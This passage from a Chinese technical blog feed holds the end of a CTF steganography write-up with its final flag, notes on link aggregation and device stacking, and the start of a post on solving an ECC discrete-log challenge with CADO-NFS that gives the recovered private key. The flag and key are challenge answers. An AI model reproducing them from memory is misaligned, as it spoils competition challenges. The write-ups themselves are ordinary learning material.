<p><img data-src="https://i.loli.net/2021/01/27/6kRHfnOJqivBZPc.png" alt="" /></p>
<p>是的，没看错，二维码变了；但是还不可以扫喔.<br />
 接下来我们需要将原图和这张二维码异或一下.</p>
<p><img data-src="https://i.loli.net/2021/01/27/CADyL2eYNq9gc6n.png" alt="" /><br />
不过我还找到另一个简便的出现方式<br />
<img data-src="https://i.loli.net/2021/01/27/xhVcW7QvK415pIR.png" alt="" /><br />
不约而同地，两张图都出现了神秘的符号；<br />
 百度后了解了这是猪圈密码.<br />
<img data-src="https://i.loli.net/2021/01/27/FznuCJQO48jq7Yd.png" alt="" /></p>
<p>按照这个解密就好了；</p>
<p>最后得到 flag: <span class="spoiler bulr" title="快走开(╯▔皿▔)╯">flag{dajiadoaidjb}</span></p>
<p>还是挺简单的，但是之前没接触过 zlib,stegsolve 用得也不熟练，还得做加把劲骑士呢</p>
]]></content>
      <categories>
        <category>wp</category>
        <category>misc</category>
      </categories>
      <tags>
        <tag>图片隐写</tag>
      </tags>
  </entry>
  <entry>
    <title>链路聚合</title>
    <url>/%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88/</url>
    <content><![CDATA[<p>做链路聚合可以提高我们网络的可靠性，同时能够增加带宽，也可以为我们提供备份<br />
<a id="more"></a></p>
<h2 id="网络可靠性需求"><a class="anchor" href="#网络可靠性需求">#</a> 网络可靠性需求</h2>
<p><img data-src="https://i.loli.net/2021/09/16/lFZRp3TAnajOhNk.png" alt="QQ截图20210916194539.png" /></p>
<p><img data-src="https://s3.bmp.ovh/imgs/2021/09/e1e9f18da020ffae.png" alt="" title="线路板故障的话，接口会受到影响哦" /></p>
<p><img data-src="https://s3.bmp.ovh/imgs/2021/09/1e2fd587ccba2b3b.png" alt="" /></p>
<p><mark>生成树协议，避免环路产生</mark></p>
<p><img data-src="https://s3.bmp.ovh/imgs/2021/09/71dd1025f1295619.png" alt="" /></p>
<p>可要能够提供冗余备份，能够避免环路的同时又充分利用带宽该怎么做呢？？</p>
<h2 id="链路聚合技术原理与配置"><a class="anchor" href="#链路聚合技术原理与配置">#</a> 链路聚合技术原理与配置</h2>
<p>链路聚合分为两类：</p>
<ol>
<li>手动链路聚合</li>
<li>LACP 动态协商：设备和设备之间相互交互协议报文，在链路发生故障后，它可以从非活动接口中挑选其一出来作为我们的一个备用端口</li>
</ol>
<p><img data-src="https://s3.bmp.ovh/imgs/2021/09/f24c64b04187fef6.png" alt="" /></p>
<p>虽然设备与设备之间有四根链路存在，但其实只有一根链路在工作，当链路发生故障时会启用下一根备份链路；但是当正常工作时，剩余三根链路处于空闲状态，造成带宽浪费。这也是生成树协议的缺点所在</p>
<p>那么如何解决这个问题呢？</p>
<p>这时就需要用到我们的链路聚合技术了<br />
<img data-src="https://s3.bmp.ovh/imgs/2021/09/7bb275023640adee.png" alt="" /></p>
<p><img data-src="https://s3.bmp.ovh/imgs/2021/09/3ec5d75291597a3b.png" alt="" /></p>
<p>转发数据实际运用时存在两种负载分担的方式：基于数据包和基于数据流；<br />
前者可以真正实现我们链路上的负载分担（即每一根链路转发的流量是一样的，但存在一个乱序的问题）而后者可以解决乱序的问题</p>
<h2 id="堆叠集群概述"><a class="anchor" href="#堆叠集群概述">#</a> 堆叠 / 集群概述</h2>
<p>链路聚合是在链路层面实现高可靠性，若是在设备层面实现高可靠性我们可以采取堆叠 / 集群的技术<br />
<img data-src="https://s3.bmp.ovh/imgs/2021/09/bbdf61b02850f4d7.png" alt="" /></p>
<p>堆叠 / 集群可以避免单点故障，可以实现跨设备的链路聚合，利用率 100％<br />
<img data-src="https://s3.bmp.ovh/imgs/2021/09/7e5291b412f396a1.png" alt="" /></p>
<p><img data-src="https://s3.bmp.ovh/imgs/2021/09/d7893e800d26e6fe.png" alt="" /></p>
<ol>
<li>扩充端口</li>
<li>提高带宽</li>
</ol>
<p><img data-src="https://s3.bmp.ovh/imgs/2021/09/adca18cb4a23156f.png" alt="" /><br />
简化网络配置</p>
<p><img data-src="https://i.loli.net/2021/09/17/nV6iOJvxDpNBlM1.png" alt="QQ截图20210916204625.png" /></p>
<p><img data-src="https://i.loli.net/2021/09/22/5mYsOh3ztyNelRp.png" alt="QQ截图20210916204625.png" /></p>
]]></content>
      <categories>
        <category>计算机网络基础</category>
        <category>链路聚合</category>
      </categories>
      <tags>
        <tag>链路聚合</tag>
      </tags>
  </entry>
  <entry>
    <title>利用Cado-nfs来解决离散对数问题</title>
    <url>/number/math/Cado%E8%A7%A3%E5%86%B3DLP/</url>
    <content><![CDATA[<p>​	最近在看椭圆曲线的一道挑战题最关键的一部分是私钥求解，这也是 ECC 加密里面保证安全性的核心算法，破译明文问题的关键就在于如何破解私钥 —— 即解决 ECDLP 问题；</p>
<p><a id="more"></a></p>
<p>截取 &quot;问题描述&quot;</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>选择椭圆曲线上的一点</mtext><mi>P</mi><mo>=</mo><mo stretchy="false">[</mo><mn>0</mn><mi>x</mi><mn>4</mn><mi>f</mi><mn>1</mn><mi>e</mi><mi>c</mi><mi>a</mi><mi>c</mi><mi>c</mi><mn>3</mn><mi>b</mi><mn>1</mn><mi>e</mi><mn>56066</mn><mi>b</mi><mn>02</mn><mi>f</mi><mn>6</mn><mi>a</mi><mn>6033</mn><mi>f</mi><mn>940</mn><mi>f</mi><mi>c</mi><mn>5</mn><mi>c</mi><mn>9805</mn><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">]</mo><mspace linebreak="newline"></mspace><msub><mi>Q</mi><mi>A</mi></msub><mo>=</mo><mo stretchy="false">[</mo><msub><mi>n</mi><mi>A</mi></msub><mo stretchy="false">]</mo><mi>P</mi><mo>=</mo><mo stretchy="false">[</mo><mn>0</mn><mi>x</mi><mi>b</mi><mn>50</mn><mi>e</mi><mn>2</mn><mi>e</mi><mi>b</mi><mn>55</mn><mi>c</mi><mi>d</mi><mn>84112077</mn><mi>a</mi><mn>5</mn><mi>a</mi><mi>c</mi><mi>c</mi><mi>a</mi><mn>94</mn><mi>b</mi><mn>4623</mn><mi>a</mi><mn>8</mn><mi>b</mi><mn>020</mn><mi>d</mi><mn>7</mn><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">]</mo><mo separator="true">,</mo><mspace linebreak="newline"></mspace><mtext>选择大素数</mtext><mi>p</mi><mo>=</mo><mn>0</mn><mi>x</mi><mi>b</mi><mn>77902</mn><mi>a</mi><mi>b</mi><mi>d</mi><mn>8</mn><mi>d</mi><mi>b</mi><mn>9627</mn><mi>f</mi><mn>5</mn><mi>d</mi><mn>7</mn><mi>c</mi><mi>e</mi><mi>c</mi><mi>a</mi><mn>5</mn><mi>c</mi><mn>17</mn><mi>e</mi><mi>f</mi><mn>6</mn><mi>c</mi><mn>5</mn><mi>e</mi><mn>3</mn><mi>b</mi><mn>0969</mn><mspace linebreak="newline"></mspace><mtext>任务就是求解私钥</mtext><msub><mi>n</mi><mi>A</mi></msub><mtext>啦</mtext><msup><mspace linebreak="newline"></mspace><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi>n</mi><mi>A</mi><mo>=</mo><mn>0</mn><mi>x</mi><mn>9022802</mn><mi>b</mi><mi>b</mi><mn>688656</mn><mi>e</mi><mi>e</mi><mn>1914</mn><mi>e</mi><mn>6</mn><mi>d</mi><mi>d</mi><mn>7</mn><mi>f</mi><mn>74</mn><mi>e</mi><mn>1</mn><mi>e</mi><mi>c</mi><mi>d</mi><mn>1</mn><mi>d</mi><mn>678</mn><msup><mn>0</mn><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">选择椭圆曲线上的一点
P = [0x4f1ecacc3b1e56066b02f6a6033f940fc5c9805, 0] \\
Q_A = [n_A]P = [0xb50e2eb55cd84112077a5acca94b4623a8b020d7, 0],\\
选择大素数 p = 0xb77902abd8db9627f5d7ceca5c17ef6c5e3b0969\\任务就是求解私钥n_A啦\\
&#x27;nA = 0x9022802bb688656ee1914e6dd7f74e1ecd1d6780&#x27;
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">选</span><span class="mord cjk_fallback">择</span><span class="mord cjk_fallback">椭</span><span class="mord cjk_fallback">圆</span><span class="mord cjk_fallback">曲</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">点</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord">4</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord">1</span><span class="mord mathnormal">e</span><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal">c</span><span class="mord mathnormal">c</span><span class="mord">3</span><span class="mord mathnormal">b</span><span class="mord">1</span><span class="mord mathnormal">e</span><span class="mord">5</span><span class="mord">6</span><span class="mord">0</span><span class="mord">6</span><span class="mord">6</span><span class="mord mathnormal">b</span><span class="mord">0</span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord">6</span><span class="mord mathnormal">a</span><span class="mord">6</span><span class="mord">0</span><span class="mord">3</span><span class="mord">3</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord">9</span><span class="mord">4</span><span class="mord">0</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">c</span><span class="mord">5</span><span class="mord mathnormal">c</span><span class="mord">9</span><span class="mord">8</span><span class="mord">0</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mclose">]</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord mathnormal">b</span><span class="mord">5</span><span class="mord">0</span><span class="mord mathnormal">e</span><span class="mord">2</span><span class="mord mathnormal">e</span><span class="mord mathnormal">b</span><span class="mord">5</span><span class="mord">5</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mord">8</span><span class="mord">4</span><span class="mord">1</span><span class="mord">1</span><span class="mord">2</span><span class="mord">0</span><span class="mord">7</span><span class="mord">7</span><span class="mord mathnormal">a</span><span class="mord">5</span><span class="mord mathnormal">a</span><span class="mord mathnormal">c</span><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord">9</span><span class="mord">4</span><span class="mord mathnormal">b</span><span class="mord">4</span><span class="mord">6</span><span class="mord">2</span><span class="mord">3</span><span class="mord mathnormal">a</span><span class="mord">8</span><span class="mord mathnormal">b</span><span class="mord">0</span><span class="mord">2</span><span class="mord">0</span><span class="mord mathnormal">d</span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mclose">]</span><span class="mpunct">,</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">选</span><span class="mord cjk_fallback">择</span><span class="mord cjk_fallback">大</span><span class="mord cjk_fallback">素</span><span class="mord cjk_fallback">数</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord mathnormal">b</span><span class="mord">7</span><span class="mord">7</span><span class="mord">9</span><span class="mord">0</span><span class="mord">2</span><span class="mord mathnormal">a</span><span class="mord mathnormal">b</span><span class="mord mathnormal">d</span><span class="mord">8</span><span class="mord mathnormal">d</span><span class="mord mathnormal">b</span><span class="mord">9</span><span class="mord">6</span><span class="mord">2</span><span class="mord">7</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord">5</span><span class="mord mathnormal">d</span><span class="mord">7</span><span class="mord mathnormal">c</span><span class="mord mathnormal">e</span><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord">5</span><span class="mord mathnormal">c</span><span class="mord">1</span><span class="mord">7</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord">6</span><span class="mord mathnormal">c</span><span class="mord">5</span><span class="mord mathnormal">e</span><span class="mord">3</span><span class="mord mathnormal">b</span><span class="mord">0</span><span class="mord">9</span><span class="mord">6</span><span class="mord">9</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.9518920000000001em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">任</span><span class="mord cjk_fallback">务</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">求</span><span class="mord cjk_fallback">解</span><span class="mord cjk_fallback">私</span><span class="mord cjk_fallback">钥</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">啦</span><span class="mord"><span class="mspace newline"></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.801892em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.996332em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord">9</span><span class="mord">0</span><span class="mord">2</span><span class="mord">2</span><span class="mord">8</span><span class="mord">0</span><span class="mord">2</span><span class="mord mathnormal">b</span><span class="mord mathnormal">b</span><span class="mord">6</span><span class="mord">8</span><span class="mord">8</span><span class="mord">6</span><span class="mord">5</span><span class="mord">6</span><span class="mord mathnormal">e</span><span class="mord mathnormal">e</span><span class="mord">1</span><span class="mord">9</span><span class="mord">1</span><span class="mord">4</span><span class="mord mathnormal">e</span><span class="mord">6</span><span class="mord mathnormal">d</span><span class="mord mathnormal">d</span><span class="mord">7</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord">7</span><span class="mord">4</span><span class="mord mathnormal">e</span><span class="mord">1</span><span class="mord mathnormal">e</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mord">1</span><span class="mord mathnormal">d</span><span class="mord">6</span><span class="mord">7</span><span class="mord">8</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.801892em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></p>
<p>​	把握一点就 OK 了，正常椭圆曲线加密里面私钥都通指采用离散对数算法形成加密，可以看作是</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>n</mi><mi>A</mi></msub><mo>=</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mi>P</mi></msub><msub><mi>Q</mi><mi>A</mi></msub></mrow><annotation encoding="application/x-tex">n_A=log_PQ_A
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p>
<h2 id="cado-nfs安装"><a class="anchor" href="#cado-nfs安装">#</a> Cado-nfs 安装</h2>
<p>这里都是基于 docker 镜像的安装 o</p>
<h3 id="下载-mitchelldehavencado-nfs镜像"><a class="anchor" href="#下载-mitchelldehavencado-nfs镜像">#</a> 下载 mitchelldehaven/cado-nfs 镜像</h3>
<figure class="highlight dockerfile"><figcaption data-lang="Docker"></figcaption><table><tr><td data-num="1"></td><td><pre>docker pull mitchelldehaven/cado<span class="token punctuation">-</span>nfs</pre></td></tr></table></figure><h3 id="运行容器打开交互界面"><a class="anchor" href="#运行容器打开交互界面">#</a> 运行容器，打开交互界面</h3>
<figure class="highlight dockerfile"><figcaption data-lang="Docker"></figcaption><table><tr><td data-num="1"></td><td><pre>docker run <span class="token punctuation">-</span>it mitchelldehaven/cado<span class="token punctuation">-</span>nfs /bin/bash</pre></td></tr></table></figure><h3 id="编译"><a class="anchor" href="#编译">#</a> 编译</h3>
<figure class="highlight dockerfile"><figcaption data-lang="Docker"></figcaption><table><tr><td data-num="1"></td><td><pre>make</pre></td></tr></table></figure><h2 id="cado-nfs使用"><a class="anchor" href="#cado-nfs使用">#</a> Cado-nfs 使用</h2>
<p>​	Cado 可以分解大整数，也可以计算离散对数；不过目前测试下来 cado 的算力还是蛮鸡肋的，拆大整数的话如果因子分解库里有现成的就不要去算了吧，真的是</p>
<h3 id="cado分解大整数"><a class="anchor" href="#cado分解大整数">#</a> Cado 分解大整数</h3>
<p>​	和 factor 用起来差不多，几乎一样</p>
<h3 id="cado计算离散对数"><a class="anchor" href="#cado计算离散对数">#</a> Cado 计算离散对数</h3>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>MultiplicativeOrder<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token operator">^</span><span class="token number">30</span> <span class="token operator">+</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">473245325750516889002351266535</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">23</span><span class="token operator">^</span>x ≡ <span class="token number">473245325750516889002351266535</span><span class="token punctuation">(</span>mod <span class="token number">10</span><span class="token operator">^</span><span class="token number">30</span><span class="token operator">+</span><span class="token number">57</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>​	不知道求离散对数有没有比较快的办法，网上普遍都是先把模数大整数 P-1 分解，很像 Pollard-Rho 算法 (暂时还没学【看不懂】)</p>
<p>​	看一下关于该算法的描述</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/05/06/3e6b7ab202b4ff3a.png" alt="" /></p>
<p>​	通过概率组合数的增加来提高算率</p>
<p>​	目标很简单，就是求出指数 x，但如果离散对数计算真那么容易，也就没如果了啊</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mn>2</mn><msup><mn>3</mn><mi>x</mi></msup><mo>≡</mo><mn>473245325750516889002351266535</mn><mi>m</mi><mi>o</mi><mi>d</mi><mn>1000000000000000000000000000057</mn></mrow><annotation encoding="application/x-tex">23^x ≡ 473245325750516889002351266535
 mod 1000000000000000000000000000057
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mord">7</span><span class="mord">3</span><span class="mord">2</span><span class="mord">4</span><span class="mord">5</span><span class="mord">3</span><span class="mord">2</span><span class="mord">5</span><span class="mord">7</span><span class="mord">5</span><span class="mord">0</span><span class="mord">5</span><span class="mord">1</span><span class="mord">6</span><span class="mord">8</span><span class="mord">8</span><span class="mord">9</span><span class="mord">0</span><span class="mord">0</span><span class="mord">2</span><span class="mord">3</span><span class="mord">5</span><span class="mord">1</span><span class="mord">2</span><span class="mord">6</span><span class="mord">6</span><span class="mord">5</span><span class="mord">3</span><span class="mord">5</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">5</span><span class="mord">7</span></span></span></span></span></p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/05/06/1a7142b37e8d7a96.png" alt="" /></p>
<p>​	二话不说我们直接开分</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/05/06/0e2c18be5fd76a90.png" alt="" /></p>
<p>​	其实这里存在一些分步运算的</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>令</mtext><mi>g</mi><mo>=</mo><mn>23</mn><mo separator="true">,</mo><mi>h</mi><mo>=</mo><mn>473245325750516889002351266535</mn><mspace linebreak="newline"></mspace><mi>x</mi><mo>=</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mi>g</mi></msub><mi>h</mi><mo>=</mo><mfrac><mrow><mi>l</mi><mi>o</mi><msubsup><mi>g</mi><mi>g</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mi>h</mi></mrow><mrow><mi>l</mi><mi>o</mi><msubsup><mi>g</mi><mi>g</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mi>g</mi></mrow></mfrac><mspace linebreak="newline"></mspace><mi>g</mi><mtext>’是运算过程的另一个基</mtext></mrow><annotation encoding="application/x-tex">令g=23,h=473245325750516889002351266535
\\x=log_gh=\frac {log_g&#x27;h} {log_g&#x27;g}\\
g’ 是运算过程的另一个基
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">令</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">2</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mord">7</span><span class="mord">3</span><span class="mord">2</span><span class="mord">4</span><span class="mord">5</span><span class="mord">3</span><span class="mord">2</span><span class="mord">5</span><span class="mord">7</span><span class="mord">5</span><span class="mord">0</span><span class="mord">5</span><span class="mord">1</span><span class="mord">6</span><span class="mord">8</span><span class="mord">8</span><span class="mord">9</span><span class="mord">0</span><span class="mord">0</span><span class="mord">2</span><span class="mord">3</span><span class="mord">5</span><span class="mord">1</span><span class="mord">2</span><span class="mord">6</span><span class="mord">6</span><span class="mord">5</span><span class="mord">3</span><span class="mord">5</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.980548em;vertical-align:-0.286108em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.594108em;vertical-align:-1.069108em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.525em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6778919999999999em;"><span style="top:-2.4530000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" 